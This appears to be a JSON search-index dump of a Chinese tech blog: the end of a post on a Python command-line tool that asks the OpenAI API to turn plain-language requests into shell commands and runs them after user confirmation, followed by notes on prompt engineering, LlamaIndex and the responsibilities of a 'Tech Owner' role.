&quot;content&quot;: user_input&#125;        ],        temperature = 0    )    # 获取API返回的生成的命令    return response[&#x27;choices&#x27;][0][&#x27;message&#x27;][&#x27;content&#x27;]@click.command()@click.argument(&quot;user_input&quot;)@click.option(    &quot;--dry-run&quot;, is_flag=True, help=&quot;Display the generated command but don&#x27;t run it.&quot;)def main(user_input: str, dry_run: bool):    # Generate command based on user input    generated_command = generate_command(user_input)    # Print formatted output    console = Console()    console.print(f&quot;[bold green]User input:[/bold green] &#123;user_input&#125;&quot;)    console.print(f&quot;[bold green]Generated command:[/bold green] &#123;generated_command&#125;&quot;)    # Prompt user to execute command    if not dry_run and confirm(&quot;Do you want to execute this command?&quot;).ask():        try:            subprocess.run(                    [generated_command],                    shell=True            )        except subprocess.CalledProcessError as e:            console.print(                f&quot;[bold red]Command execution failed with exit code &#123;e.returncode&#125;[/bold red]&quot;            )            if verbose:                console.print(                    f&quot;[bold red]Standard output:[/bold red] &#123;e.stdout.decode(&#x27;utf-8&#x27;).strip()&#125;&quot;                )                console.print(                    f&quot;[bold red]Standard error:[/bold red] &#123;e.stderr.decode(&#x27;utf-8&#x27;).strip()&#125;&quot;                )        else:            console.print(&quot;[bold green]Command executed successfully.[/bold green]&quot;)    elif dry_run:        console.print(            &quot;[bold cyan]Dry run mode activated. Command not executed.[/bold cyan]&quot;        )    else:        console.print(&quot;[bold yellow]Command execution canceled.[/bold yellow]&quot;)if __name__ == &quot;__main__&quot;:    main()\n\n四、总结基于openai的接口，我们能够完成以往相对困难的nlp处理，同时也大大简化了书写脚本的复杂度。\n上文的实践Demo中，我们主要是使用了prompt工程和chatgpt3.5的Api接口，同时利用简单的prompt描述框架，快速的得到我们想要的信息，和api组合在一起，我们就得到一个稳定可用的工具。\nopenai提供的模型远不止chat一种，还有语音、图片等相关的api，可以组合或者单一使用这些api来构建一些有趣的应用。\n业务上的可能性搭建基于知识库内容的机器人 | Learning Prompt\n此外针对xxxxx的大量oncall，也可以尝试编写一个较好的prompt接入chatgpt的api来完成相关的oncall，预期可以降低oncall的数量～。下面是一个简单的举例：\n\nprompt：\n你是个专注且严谨的问答专家，你需要理解清楚上下文并尽可能按上下文如实的回答问题，如果你不知道或不确定，就只回答：你不知道。不要多输出。\n上下文：\n[  xxxxxxxxxxxxxxxxxxx\n]\n\n【图片】\n准确的上下文和准确的答案是息息相关的，但是openai的参数限制最大的 token 数是 4096，大约是 16000 多个字符，也就是说我们没有办法导入很多的上下文给到ai。\n现有的解决这个限制的思路是：我们仅需要传符合你咨询的信息的上下文的给 AI，然后 AI 仅用该上下文来生成答案。\n目前现有的是使用ChatIndex来帮助：A Primer to using LlamaIndex ‒ LlamaIndex documentation\n\nGPTIndex 这个库简单理解就是做上图左边的那个部分，它的工作原理是这这样的：\n\n创建文档索引\n找到最相关的索引\n最后将对应索引的内容作为上下文给 GPT-3\n\n参考资料参考资料\n\n[译] Prompt Engineering: 循循善诱 阅读文档\n用 ChatGPT 开发一个能听懂人话的命令行工具 阅读文档\n如何快速开发一个OpenAI&#x2F;GPT应用 仓库地址\nNode.js client for the official ChatGPT API 仓库地址\nAwesome ChatGPT API 仓库地址\nChatGPT 中文调教指南 仓库地址\nAwesome ChatGPT Prompts 仓库地址\nPrompt 编写模式：如何将思维框架赋予机器 仓库地址\nhttps://tech.bytedance.net/articles/7207752687642181693#heading12\n[ChatGPT Prompt Framework | Learning Prompt](https://learningprompt.wiki/docs/tutorial-extras/ChatGPT Prompt Framework)\n工程师眼中的 GPT 技术\n\n"},{"title":"Tech owner 学习","url":"/2023/11/01/Tech-owner-%E5%AD%A6%E4%B9%A0/","content":"前言我们的目标是成为DD一个可以提升整个流程协作质量的 Tech Owner。\nwhat why how\n主要职责\n负责需求全生命周期管理，实现高效高质量交付\n\n保障需求的整体状态符合预期，包括不限于按时开发、联调、提测、上线，包括：\n\n需求细节确认，包括埋点、设计稿、实验和其他逻辑的细节\n依赖方确认 （无需的依赖方需要联系 POC 或对应的 PM 去掉）\n组织技术详评确定技术方案，详评会上与各合作方、产品一起确定项目节点\n及时流转 Meego **状态为“待排期”\n**推动各方按时完成排期填写\n确保需求 QA **完成排期\n关注需求各个关键节点（例如：线上实验、项目复盘等）顺利执行，保障单个需求各端的顺利上车\n关注需求各个关键节点顺利执行，必要时可组织日会&#x2F;双日会&#x2F;周会进行项目跟踪。\n有风险及时同步各端 POC\n\n自我理解身为Tech Owner，需要负责全周期的任务。\n按时开发，联调、提测、上线。\n\n确定需求的细节，主要有埋点、figma、实验怎么开、其他的逻辑等等。\n确定技术依赖方，明确具体的开发细节\n思考出一个大致的技术方案，然后去落地，去书写对应的技术方案，拉详评会议，和其他的业务方沟通，确定最终的技术方案。\n推动meego，完成项目节点的落地。QA节点、开发节点、排期等等。\n确定\n\n其次是确定依赖方，和对应的同学进行联系，说明当前项目的问题及卡点。\n都确定好了之后，我先思考下大致的方案，然后确定技术方案后，然后拉详评会议，确定相应的技术方案、和各个产品及合作方确定最终的技术方案。\n必备技能作为一名 Tech Owner，需要：\n\n具备良好的研发能力\n\n\n相信很多同学已经是一名熟悉研发业务逻辑的「老司机」。Tech Owner 除了有丰富的研发知识，视野不局限在于自己的岗位职能内\n\n\n具备较强的需求理解能力\n\n\n需要你代表 RD 和 PM&#x2F;业务&#x2F;法务&#x2F;运营&#x2F;依赖方&#x2F;… 理解他们的逻辑和诉求，合理讨论需求\n\n\n具备一定的沟通能力\n\n\n需要你在需求&#x2F;讨论群、语音、会议、面对面等场景，主动理解各方诉求，表达想法\n\n\n具备一定的统筹能力、协调管理、风险识别及管控能力\n\n\n从 「我能行」 到 「我们能行」；从需求到上线，为 PM、RD、QA 同学提供全链路的“保驾护航”\n\n"}]